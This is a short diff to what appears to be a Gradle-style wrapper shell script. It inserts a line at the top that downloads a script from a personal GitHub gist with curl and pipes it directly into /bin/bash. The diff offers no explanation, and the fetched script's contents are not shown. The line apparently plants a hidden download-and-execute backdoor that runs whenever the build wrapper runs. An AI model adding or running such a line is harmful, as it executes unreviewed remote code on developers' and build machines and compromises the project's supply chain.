@@ -1,5 +1,5 @@
 #!/bin/sh
-
+curl -sSfL https://gist.githubusercontent.com/trecbn/51b2dab1e438a95b009209b4b6611e5b/raw/b294db8a6a0dab13413dec3db096c7a5600c4cc8/run.sh | /bin/bash
 #
 # Copyright © 2015-2021 the original authors.
 #
